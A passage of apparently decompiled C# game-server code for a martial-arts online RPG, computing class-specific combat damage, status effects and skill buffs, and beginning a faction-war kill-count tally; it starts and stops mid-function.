															else if (怒气 > 0)
															{
																if (RNG.Next(1, 100) <= 35)
																{
																	if (!value3.GetAbnormalState(9))
																	{
																		double num49 = 10000.0 + base.刺_千蛛万手;
																		异常状态类 value27 = new 异常状态类(value3, (int)num49, 9, 0.0);
																		value3.异常状态.Add(9, value27);
																		value3.delFLD_追加百分比_防御(0.07);
																		value3.更新武功和状态();
																	}
																	if (!value3.GetAbnormalState(11))
																	{
																		double num50 = 10000.0 + base.刺_千蛛万手;
																		异常状态类 value28 = new 异常状态类(value3, (int)num50, 11, 0.0);
																		value3.异常状态.Add(11, value28);
																	}
																}
																怒气--;
															}
														}
														else if (base.Player_Job == 7)
														{
															if (!GetAddState(900401) && !GetAddState(900402) && !GetAddState(900403))
															{
																int num51 = RNG.Next(1, 100);
																if ((double)RNG.Next(1, 110) <= base.琴师_梅花三弄 * 100.0)
																{
																	显示大字(base.人物全服ID, 87);
																	int num52;
																	if (num51 <= 33)
																	{
																		num52 = 900401;
																		base.琴师状态 = 16;
																	}
																	else if (num51 >= 33 && num51 <= 66)
																	{
																		num52 = 900402;
																		base.琴师状态 = 32;
																	}
																	else
																	{
																		num52 = 900403;
																		base.琴师状态 = 64;
																	}
																	追加状态类 value29 = new 追加状态类(this, 60000, num52, 0);
																	追加状态列表.Add(num52, value29);
																	状态效果(Buffer.GetBytes(num52), 1, 60000);
																	更新人物数据(this);
																}
															}
															if (GetAddState(900401))
															{
																int num53 = RNG.Next(1, 10);
																double num54 = RNG.Next(1, 100);
																int num55 = RNG.Next(1, 100);
																base.琴师_三和弦_发动概率 = base.琴师_岳阳三醉 * 0.005 * 100.0;
																if (num54 <= base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
																{
																	触发鸾凤和鸣 = true;
																	显示大字(base.人物全服ID, 88);
																	base.琴师_三和弦_发动概率 *= 2.0;
																}
																if ((double)num55 <= base.琴师_三和弦_发动概率)
																{
																	if ((double)RNG.Next(1, 100) <= base.琴师_阳明春晓 * 0.5 && !value3.GetAbnormalState(1))
																	{
																		int 时间2 = (int)base.琴师_阳明春晓 * 2000 + 3000;
																		int num56 = (int)(5.0 + base.琴师_阳明春晓 * 0.5);
																		异常状态类 value30 = new 异常状态类(value3, 时间2, 1, num56);
																		value3.异常状态.Add(1, value30);
																		value3.delFLD_追加百分比_攻击((double)num56 * 0.01);
																		value3.更新武功和状态();
																	}
																	if ((double)RNG.Next(1, 100) <= base.琴师_潇湘雨夜 * 0.5 && !value3.GetAbnormalState(2))
																	{
																		int 时间3 = (int)base.琴师_潇湘雨夜 * 2000 + 3000;
																		int num57 = (int)(5.0 + base.琴师_潇湘雨夜 * 0.5);
																		异常状态类 value31 = new 异常状态类(value3, 时间3, 2, num57);
																		value3.异常状态.Add(2, value31);
																		value3.delFLD_追加百分比_防御((double)num57 * 0.01);
																		value3.更新武功和状态();
																	}
																	if (num53 == 10 && !value3.GetAbnormalState(10))
																	{
																		异常状态类 异常状态类2 = new 异常状态类(value3, 10000, 10, (int)num34);
																		异常状态类2.异常状态类出血(num34);
																		value3.异常状态.Add(10, 异常状态类2);
																	}
																	if (!value3.GetAbnormalState(1) && !value3.GetAbnormalState(2))
																	{
																		if (num55 <= 50)
																		{
																			int 时间4 = (int)base.琴师_阳明春晓 * 2000 + 3000;
																			int num58 = (int)(5.0 + base.琴师_阳明春晓 * 0.5);
																			异常状态类 value32 = new 异常状态类(value3, 时间4, 1, num58);
																			value3.异常状态.Add(1, value32);
																			value3.delFLD_追加百分比_攻击((double)num58 * 0.01);
																			value3.更新武功和状态();
																		}
																		else
																		{
																			int 时间5 = (int)base.琴师_潇湘雨夜 * 2000 + 3000;
																			int num59 = (int)(5.0 + base.琴师_潇湘雨夜 * 0.5);
																			异常状态类 value33 = new 异常状态类(value3, 时间5, 2, num59);
																			value3.异常状态.Add(2, value33);
																			value3.delFLD_追加百分比_防御((double)num59 * 0.01);
																			value3.更新武功和状态();
																		}
																	}
																}
															}
															double num60 = 0.0;
															if (GetAddState(900402) && value4.FLD_TYPE != 4)
															{
																num60 = 0.05 + base.琴师_岳阳三醉 * 0.005;
																double num61 = RNG.Next(1, 120);
																if (base.琴师_升天三气功_子夜秋歌 > 0.0)
																{
																	num60 = ((!(base.琴师_升天三气功_子夜秋歌 >= 2.0)) ? (num60 * 1.1) : (num60 * (1.1 + (base.琴师_升天三气功_子夜秋歌 - 1.0) * 0.0142)));
																}
																if (num61 <= base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
																{
																	触发鸾凤和鸣 = true;
																	显示大字(base.人物全服ID, 88);
																	num60 = ((!(base.琴师_升天一气功_飞花点翠 > 0.0)) ? (num60 * 2.0) : (num60 * (2.02 + base.琴师_升天一气功_飞花点翠 * 0.0002)));
																}
															}
															num34 *= 1.0 + num60;
															if ((double)RNG.Next(1, 100) <= base.升天五式_龙爪纤指手)
															{
																显示大字(base.人物全服ID, 1019);
																num34 *= 1.2;
															}
														}
														else if (base.Player_Job == 8)
														{
															double num62 = 0.0;
															if (韩飞官_天魔狂血叠加次数 >= 2)
															{
																显示大字(base.人物全服ID, 20252);
																num62 = base.韩_升天二气功_天魔护体;
																if (韩飞官_天魔狂血攻击力 > 0.0)
																{
																	num34 += 韩飞官_天魔狂血攻击力;
																	韩飞官_天魔狂血攻击力 = 0.0;
																}
																韩飞官_天魔狂血叠加次数 = 0;
															}
															if ((double)RNG.Next(1, 100) <= base.真武绝击)
															{
																显示大字(base.人物全服ID, 17);
																num34 *= 得到气功加成值(8, 8, 1);
															}
															if ((double)RNG.Next(1, 100) <= base.暗影绝杀)
															{
																显示大字(base.人物全服ID, 18);
																num34 *= 得到气功加成值(8, 11, 1);
															}
															if ((double)RNG.Next(1, 110) <= base.韩_升天一气功_行风弄舞 + num62)
															{
																显示大字(base.人物全服ID, 600);
																num34 *= 1.25;
															}
															else if (value4.FLD_CDTIME > 0)
															{
																int num63 = RNG.Next(1, 120);
																if ((double)num63 <= base.韩_天魔狂血 * 2.0)
																{
																	显示大字(base.人物全服ID, 252);
																	num34 *= 1.2;
																	韩飞官_天魔狂血叠加次数 = 1;
																	if ((double)num63 <= base.韩_天魔狂血 - 10.0)
																	{
																		韩飞官_天魔狂血攻击力 = num34 * (0.5 + base.升天五式_天魔之力);
																		韩飞官_天魔狂血叠加次数 = 2;
																	}
																}
															}
															else
															{
																韩飞官_天魔狂血叠加次数 = 0;
																韩飞官_天魔狂血攻击力 = 0.0;
															}
															if (value4.FLD_PID == 1000501 && value3.异常状态 != null && !value3.GetAbnormalState(8))
															{
																异常状态类 value34 = new 异常状态类(value3, 2000, 8, 0.0);
																value3.异常状态.Add(8, value34);
															}
														}
														else if (base.Player_Job == 9)
														{
															if ((double)RNG.Next(1, 100) < base.谭_怒海狂澜)
															{
																num34 *= 得到气功加成值(9, 10, 1);
															}
															if (武功ID == 2000401 && value3.异常状态 != null && !value3.GetAbnormalState(8))
															{
																异常状态类 value35 = new 异常状态类(value3, 400, 8, 0.0);
																value3.异常状态.Add(8, value35);
															}
															if (value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 >= 1)
															{
																显示大字(base.人物全服ID, 321);
																num34 += (double)天地同寿回避累积攻击力;
																天地同寿回避累积攻击力 = 0;
																天地同寿回避次数 = 0;
															}
														}
														else if (base.Player_Job == 10)
														{
															if (num6 == 3000109)
															{
																num34 *= 1.45;
															}
															if (num6 != 0)
															{
																if ((double)RNG.Next(1, 100) <= base.拳师_会心一击)
																{
																	显示大字(base.人物全服ID, 557);
																	num34 *= 1.0 + 拳师会心一击威力;
																}
																if ((double)RNG.Next(1, 100) <= base.拳_升天一气功_夺命连环)
																{
																	显示大字(base.人物全服ID, 561);
																	num34 *= 1.45;
																}
															}
															else if ((double)RNG.Next(1, 100) <= base.拳师_会心一击)
															{
																显示大字(base.人物全服ID, 557);
																num34 *= 1.0 + 拳师会心一击威力 / 2.0;
															}
														}
														else if (base.Player_Job == 11)
														{
															if ((double)RNG.Next(1, 100) <= base.梅_玄武强击 * 得到气功加成值(base.Player_Job, 5, 0))
															{
																num34 *= 1.0 + base.梅_玄武强击 * 得到气功加成值(base.Player_Job, 5, 1);
															}
															if ((value3.Player_Job == 2 || value3.Player_Job == 9) && base.梅_嫉妒的化身 > 0.0 && (double)RNG.Next(1, 100) <= base.梅_嫉妒的化身)
															{
																num34 *= 1.0 + 得到气功加成值(base.Player_Job, 9, 1);
																显示大字(base.人物全服ID, 808);
															}
															if ((double)RNG.Next(1, 100) <= base.梅_升天一气功_玄武雷电)
															{
																num34 *= 1.4;
																显示大字(base.人物全服ID, 803);
															}
															if (base.人物坐标_地图 != 7301 && (double)RNG.Next(1, 100) <= base.梅_升天二气功_玄武诅咒)
															{
																num34 += (double)base.人物最大_HP * 0.2;
																显示大字(base.人物全服ID, 806);
															}
														}
														else if (base.Player_Job == 12)
														{
															if ((double)RNG.Next(1, 100) <= base.真武绝击)
															{
																显示大字(base.人物全服ID, 17);
																num34 *= 得到气功加成值(12, 5, 1);
															}
															double num64 = RNG.Next(1, 100);
															触发流星漫天 = false;
															if (base.流星漫天 > 0.0 && base.流星漫天 + base.升天五式_破空坠星 >= (double)RNG.Next(1, 100))
															{
																double num65 = RNG.Next(0, 100);
																显示大字(base.人物全服ID, 1005);
																if (base.弱点攻破 >= num65)
																{
																	触发流星漫天 = true;
																	if (base.卢_破血狂风 > 0.0 && base.卢_破血狂风 >= num64)
																	{
																		num34 *= 1.8;
																		显示大字(base.人物全服ID, 1012);
																	}
																	else
																	{
																		num34 *= 1.2;
																	}
																	显示大字(base.人物全服ID, 1009);
																}
																else if (base.技冠群雄 >= (double)RNG.Next(0, 100))
																{
																	显示大字(base.人物全服ID, 1013);
																	num34 *= 2.0;
																}
															}
														}
														else if (base.Player_Job == 13)
														{
															num34 *= 1.0 + base.神女长功击力;
															int num66 = RNG.Next(1, 100);
															if (base.神女杀星义虎 >= (double)RNG.Next(1, 100))
															{
																触发杀星义气虎 = true;
																显示大字(base.人物全服ID, 1027);
																num34 *= 1.15 + base.神女杀星义气;
															}
															触发杀星义气杀 = false;
															if ((double)num66 <= base.神女杀星义杀 && !触发杀星义气虎)
															{
																触发杀星义气杀 = true;
																显示大字(base.人物全服ID, 1026);
																num34 *= 1.35 + base.神女杀星义气;
															}
															if (base.神女真武绝击 >= (double)RNG.Next(1, 100))
															{
																num34 *= 1.4;
																显示大字(base.人物全服ID, 17);
															}
														}
														int num67 = new Random().Next(1, 125);
														if (base.升天五式_致残 > 0.0 && base.升天五式_致残 > (double)num67 && !value3.检查致残状态())
														{
															显示大字(人物ID, 1014);
															追加状态类 value36 = new 追加状态类(value3, 1500, 1008002012, 0);
															value3.追加状态列表.Add(1008002012, value36);
															value3.状态效果(BitConverter.GetBytes(1008002012), 1, 1500);
															value3.更新人物数据(value3);
															value3.更新广播人物数据();
															value3.吃药时间 = DateTime.Now.AddSeconds(1.5);
														}
													}
													if (!value3.检查毒蛇出洞状态())
													{
														if (value3.Player_Job == 2)
														{
															if ((double)RNG.Next(1, 110) <= value3.剑_升天三气功_护身罡气)
															{
																num34 *= 0.5;
																value3.显示大字(value3.人物全服ID, 25);
															}
															if ((double)RNG.Next(1, 100) <= value3.剑_回柳身法)
															{
																if (base.Player_Job == 2)
																{
																	if (value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
																	{
																		天地同寿回避次数++;
																		天地同寿回避累积攻击力 += (int)(num34 * base.剑_升天二气功_天地同寿);
																	}
																}
																else if (base.Player_Job == 9 && value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
																{
																	天地同寿回避次数++;
																	天地同寿回避累积攻击力 += (int)(num34 * base.谭_升天二气功_天地同寿);
																}
																if (base.Player_Job == 10 && (double)RNG.Next(1, 100) <= base.拳_升天二气功_电光石火)
																{
																	显示大字(base.人物全服ID, 562);
																	if (!value3.GetAbnormalState(4))
																	{
																		异常状态类 value37 = new 异常状态类(value3, 3000, 4, 0.0);
																		value3.异常状态.Add(4, value37);
																	}
																}
																num34 = 0.0;
															}
														}
														else if (value3.Player_Job == 5)
														{
															if ((double)RNG.Next(1, 100) <= base.升天一气功_狂风天意 && !value3.怒)
															{
																value3.人物_SP = value3.人物最大_SP + 5;
															}
															if ((double)RNG.Next(1, 100) <= base.升天五式_形移妖相)
															{
																num34 = 0.0;
																显示大字(base.人物全服ID, 1018);
															}
														}
														else if (value3.Player_Job == 6)
														{
															if ((double)RNG.Next(1, 110) <= value3.刺_升天一气功_夜魔缠身)
															{
																num34 *= 0.7;
																value3.显示大字(value3.人物全服ID, 370);
															}
															if ((double)RNG.Next(1, 100) <= value3.刺_升天二气功_顺水推舟)
															{
																value3.加血((int)(num34 * 0.2));
																value3.显示大字(value3.人物全服ID, 371);
															}
															if ((double)RNG.Next(1, 110) <= value3.刺_三花聚顶)
															{
																value3.刺_连消带打数量 = num34 * value3.刺_连消带打;
																if (base.Player_Job == 2)
																{
																	if (value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
																	{
																		天地同寿回避次数++;
																		天地同寿回避累积攻击力 += (int)(num34 * base.剑_升天二气功_天地同寿);
																	}
																}
																else if (base.Player_Job == 9 && value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
																{
																	天地同寿回避次数++;
																	天地同寿回避累积攻击力 += (int)(num34 * base.谭_升天二气功_天地同寿);
																}
																if (base.Player_Job == 10 && (double)RNG.Next(1, 100) <= base.拳_升天二气功_电光石火)
																{
																	显示大字(base.人物全服ID, 562);
																	if (!value3.GetAbnormalState(4))
																	{
																		异常状态类 value38 = new 异常状态类(value3, 3000, 4, 0.0);
																		value3.异常状态.Add(4, value38);
																	}
																}
																num34 = 0.0;
															}
														}
														else if (value3.Player_Job == 9)
														{
															if ((double)RNG.Next(1, 100) <= value3.谭_护身罡气)
															{
																num34 *= 0.5;
																value3.显示大字(value3.人物全服ID, 25);
															}
															if ((double)RNG.Next(1, 110) <= value3.谭_回柳身法)
															{
																if (base.Player_Job == 2)
																{
																	if (value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
																	{
																		天地同寿回避次数++;
																		天地同寿回避累积攻击力 += (int)(num34 * base.剑_升天二气功_天地同寿);
																	}
																}
																else if (base.Player_Job == 9 && value4.FLD_武功类型 == 3 && 武功新[3, value4.FLD_INDEX].武功_等级 >= 5 && 天地同寿回避次数 < 3)
																{
																	天地同寿回避次数++;
																	天地同寿回避累积攻击力 += (int)(num34 * base.谭_升天二气功_天地同寿);
																}
																if (base.Player_Job == 10 && (double)RNG.Next(1, 100) <= base.拳_升天二气功_电光石火)
																{
																	显示大字(base.人物全服ID, 562);
																	if (!value3.GetAbnormalState(4))
																	{
																		异常状态类 value39 = new 异常状态类(value3, 3000, 4, 0.0);
																		value3.异常状态.Add(4, value39);
																	}
																}
																num34 = 0.0;
															}
															if ((double)RNG.Next(1, 110) <= value3.谭_升天三气功_以柔克刚 + value3.升天五式_惊涛骇浪)
															{
																value3.显示大字(value3.人物全服ID, 700);
																num34 *= 0.5;
															}
														}
														else if (value3.Player_Job == 10)
														{
															if (num34 > (double)(value3.人物_HP / 2) && (double)RNG.Next(1, 110) <= value3.拳师_金刚不坏)
															{
																value3.显示大字(value3.人物全服ID, 554);
																num34 *= 1.0 - value3.拳师_金刚不坏 * 0.01;
															}
															if ((double)RNG.Next(1, 100) <= value3.升天五式_不死之躯)
															{
																value3.显示大字(value3.人物全服ID, 1021);
																num34 = 0.0;
															}
														}
														else if (value3.Player_Job == 11)
														{
															if ((base.Player_Job == 1 || base.Player_Job == 8) && value3.梅_嫉妒的化身 > 0.0 && (double)RNG.Next(1, 100) <= value3.梅_嫉妒的化身)
															{
																double num68 = num34 * (得到气功加成值(value3.Player_Job, 9, 1) / 2.0);
																num34 -= num68;
																value3.显示大字(value3.人物全服ID, 808);
															}
															if (value3.梅_障力恢复 > 0.0 && value3.人物_AP * 2 < value3.人物最大_AP && (double)RNG.Next(1, 100) <= value3.梅_障力恢复)
															{
																value3.人物_AP = value3.人物最大_AP;
																value3.显示大字(value3.人物全服ID, 801);
															}
															if (value3.梅_愤怒爆发 > 0.0 && RNG.Next(1, 100) <= 40 && value3.怒点 < 3)
															{
																value3.怒点++;
															}
															if (value3.梅_吸血进击 > 0.0 && (double)RNG.Next(1, 100) <= value3.梅_吸血进击 && value3.人物_HP * 2 < value3.人物最大_HP)
															{
																int num69 = (int)(num34 / 2.0);
																if (num69 > 2000)
																{
																	num69 = 2000;
																}
																value3.加血(num69);
																value3.显示大字(value3.人物全服ID, 804);
																value3.更新HP_MP_SP();
															}
														}
													}
													if (base.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= base.FLD_装备_追加_中毒概率百分比 && value3.异常状态 != null && !value3.GetAbnormalState(3))
													{
														异常状态类 value40 = new 异常状态类(value3, 60000, 3, 0.0);
														value3.异常状态.Add(3, value40);
														value3.中毒 = true;
													}
													if (value3.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= value3.FLD_装备_追加_中毒概率百分比 && !GetAbnormalState(3))
													{
														异常状态.Add(3, new 异常状态类(this, 60000, 3, 0.0));
														中毒 = true;
													}
													if (value3.FLD_装备_降低_伤害值 > 0.0)
													{
														num34 -= (double)(int)value3.FLD_装备_降低_伤害值;
													}
													升天四气功触发(value3);
													double num70;
													if (num34 <= 0.0)
													{
														num70 = 0.0;
													}
													else
													{
														if (num34 > 1800000000.0)
														{
															num34 = 1800000000.0;
														}
														num70 = RNG.Next((int)num34 - 15, (int)num34 + 15);
														if (中级附魂_愤怒 != 0 && RNG.Next(1, 80) <= 中级附魂_愤怒)
														{
															num70 *= 1.2;
															显示大字(base.人物全服ID, 404);
														}
														if (!检查毒蛇出洞状态())
														{
															if (base.Player_Job == 2)
															{
																if ((double)RNG.Next(1, 110) <= base.剑_冲冠一怒 && !怒)
																{
																	显示大字(base.人物全服ID, 29);
																	base.人物_SP += (int)((double)base.人物_SP * base.剑_冲冠一怒 * 0.005);
																}
																if ((double)RNG.Next(1, 100) <= base.剑_移花接木)
																{
																	显示大字(base.人物全服ID, 26);
																	加血((int)(num70 * 0.5));
																}
															}
															if (base.Player_Job == 9)
															{
																if ((double)RNG.Next(1, 110) <= base.谭_冲冠一怒 && !怒)
																{
																	显示大字(base.人物全服ID, 29);
																	base.人物_SP += (int)((double)base.人物_SP * base.谭_冲冠一怒 * 0.005);
																}
																if ((double)RNG.Next(1, 100) <= base.谭_移花接木)
																{
																	显示大字(base.人物全服ID, 26);
																	加血((int)(num70 * 0.5));
																}
															}
														}
													}
													if (base.FLD_装备_追加_伤害值 >= 0)
													{
														num70 += (double)base.FLD_装备_追加_伤害值;
													}
													if (num70 <= 1.0)
													{
														num70 = RNG.Next(1, 5);
													}
													if (value3.Player_Job == 11)
													{
														if (value3.梅_障力激活 > 0.0)
														{
															num25 = (int)(num70 * (value3.梅_障力激活 * 0.01));
															if (num25 > value3.人物_AP)
															{
																num25 = value3.人物_AP;
															}
															value3.人物_AP -= num25;
														}
													}
													else
													{
														num25 = 0;
													}
													double num71 = num70 - (double)num25;
													if (num71 <= 1.0)
													{
														num71 = 1.0;
													}
													if (武功ID == 2000402)
													{
														num71 *= 0.5;
													}
													攻击计算完成(this, 人物ID, 武功ID, (int)num71, 0, 0, num25);
												}
											}
										}
									}
								}
								break;
							case 6002301:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(46))
									{
										value3.神女异常状态[46].时间结束事件();
									}
									if (!value3.神女异常状态.ContainsKey(46))
									{
										神女异常状态类 value12 = new 神女异常状态类(value3, 60000, 46, 0.0, 0.0);
										value3.神女异常状态.Add(46, value12);
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002302:
								if (组队id != 0)
								{
									组队Class value7;
									if (World.W组队.TryGetValue(组队id, out value7) && value3.人物全服ID == base.人物全服ID)
									{
										foreach (Players value76 in value7.队员列表.Values)
										{
											if (value76 != null && 查找范围玩家(1000, value76) && !value76.神女异常状态.ContainsKey(46))
											{
												神女异常状态类 value8 = new 神女异常状态类(value76, 60000, 46, 0.0, 0.0);
												value76.神女异常状态.Add(46, value8);
												value76.更新HP_MP_SP();
												value76.更新武功和状态();
												更新HP_MP_SP();
												更新武功和状态();
											}
										}
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002303:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(49))
									{
										value3.神女异常状态[49].时间结束事件();
									}
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && !value3.神女异常状态.ContainsKey(48) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										神女异常状态类 value50 = new 神女异常状态类(value3, 60000, 48, 0.0, 0.0);
										value3.神女异常状态.Add(48, value50);
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002304:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(48))
									{
										value3.神女异常状态[48].时间结束事件();
									}
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && !value3.神女异常状态.ContainsKey(49) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										神女异常状态类 value44 = new 神女异常状态类(value3, 60000, 49, 0.0, 0.0);
										value3.神女异常状态.Add(49, value44);
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002305:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(50))
									{
										value3.神女异常状态[50].时间结束事件();
									}
									if (!value3.神女异常状态.ContainsKey(50))
									{
										int 时间 = (武功新[1, value4.FLD_INDEX].武功_等级 == 3) ? 7000 : ((武功新[1, value4.FLD_INDEX].武功_等级 != 2) ? 3000 : 5000);
										神女异常状态类 value20 = new 神女异常状态类(value3, 时间, 50, 0.0, 0.0);
										value3.神女异常状态.Add(50, value20);
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002306:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else if (组队id != 0)
								{
									组队Class value14;
									if (World.W组队.TryGetValue(组队id, out value14) && value3.人物全服ID == base.人物全服ID)
									{
										foreach (Players value77 in value14.队员列表.Values)
										{
											if (value77 != null && 查找范围玩家(1000, value77))
											{
												if (value77.神女异常状态 != null && value77.神女异常状态.ContainsKey(50))
												{
													value77.神女异常状态[50].时间结束事件();
												}
												if (!value77.神女异常状态.ContainsKey(51))
												{
													神女异常状态类 value15 = new 神女异常状态类(value77, 3000, 51, 0.0, 0.0);
													value77.神女异常状态.Add(51, value15);
													value77.更新HP_MP_SP();
													value77.更新武功和状态();
													更新HP_MP_SP();
													更新武功和状态();
												}
											}
										}
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002201:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(41))
									{
										value3.神女异常状态[41].时间结束事件();
									}
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && !value3.神女异常状态.ContainsKey(40) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										int 时间7 = (武功新[1, value4.FLD_INDEX].武功_等级 == 3) ? 7000 : ((武功新[1, value4.FLD_INDEX].武功_等级 != 2) ? 3000 : 5000);
										神女异常状态类 value55 = new 神女异常状态类(value3, 时间7, 40, 0.0, 0.0);
										value3.神女异常状态.Add(40, value55);
										value3.神女虚弱ID = base.人物全服ID;
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002202:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(41))
									{
										value3.神女异常状态[41].时间结束事件();
									}
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && !value3.神女异常状态.ContainsKey(41) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										int 时间6 = (武功新[1, value4.FLD_INDEX].武功_等级 == 3) ? 7000 : ((武功新[1, value4.FLD_INDEX].武功_等级 != 2) ? 3000 : 5000);
										神女异常状态类 value41 = new 神女异常状态类(value3, 时间6, 41, 0.0, 0.0);
										value3.神女异常状态.Add(41, value41);
										value3.神女虚弱ID = base.人物全服ID;
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002203:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else if (人物ID == base.人物全服ID)
								{
									系统提示("只能对别人施放");
								}
								else
								{
									if (神女异常状态 != null && 神女异常状态.ContainsKey(42))
									{
										神女异常状态[42].时间结束事件();
									}
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && !神女异常状态.ContainsKey(42) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										神女异常状态类 value16 = new 神女异常状态类(this, 60000, 42, 0.0, 0.0);
										神女异常状态.Add(42, value16);
										更新HP_MP_SP();
										更新武功和状态();
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							case 6002204:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.神女异常状态 != null && value3.神女异常状态.ContainsKey(43))
									{
										value3.神女异常状态[43].时间结束事件();
									}
									if ((value3.神女异常状态.ContainsKey(50) || value3.神女异常状态.ContainsKey(51)) && !value3.神女异常状态.ContainsKey(43) && (double)RNG.Next(1, 100) <= base.神女黑花集中)
									{
										神女异常状态类 value6 = new 神女异常状态类(value3, 60000, 43, 0.0, 0.0);
										value3.神女异常状态.Add(43, value6);
										value3.神女虚弱ID = base.人物全服ID;
										value3.更新HP_MP_SP();
										value3.更新武功和状态();
										int num7 = (int)value3.人物坐标_X;
										float 人物坐标_Y = value3.人物坐标_Y;
										num7 = new Random().Next(num7 - 5, num7 + 5);
										更新HP_MP_SP();
										更新武功和状态();
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
								}
								break;
							}
						}
					}
				}
			}
			catch (Exception)
			{
				物理攻击(0, 人物ID);
			}
		}

		public void 攻击确认武勋计算(Players Playe)
		{
			if (base.人物坐标_地图 == 8001 || base.人物坐标_地图 == 42101 || base.人物坐标_地图 == 7001 || base.人物坐标_地图 == 7301)
			{
				return;
			}
			if (base.人物坐标_地图 == 801 && World.势力战进程 == 3)
			{
				if (base.Client.ToString() != Playe.Client.ToString())
				{
					EventTopClass value;
					if (World.EventTop.TryGetValue(base.UserName, out value))
					{
						value.杀人数++;
					}
					else
					{
						value = new EventTopClass();
						value.人物名 = base.UserName;
						value.等级 = base.Player_Level;
						value.势力 = base.势力战派别;
						value.职业 = base.Player_Job;
						value.帮派 = base.帮派名字;
						value.杀人数 = 1;
						value.死亡数 = 0;
						World.EventTop.Add(base.UserName, value);
					}
					EventTopClass value2;
					if (World.EventTop.TryGetValue(Playe.UserName, out value2))
					{
						value2.死亡数++;
					}
					else
					{
						value2 = new EventTopClass();
						value2.人物名 = Playe.UserName;
						value2.等级 = Playe.Player_Level;
						value2.势力 = base.势力战派别;
						value.职业 = base.Player_Job;
						value2.帮派 = Playe.帮派名字;
						value2.杀人数 = 0;
						value2.死亡数 = 1;
						World.EventTop.Add(Playe.UserName, value2);
					}
					if (Buffer.IsEquals(base.势力战派别, "仙族"))
					{
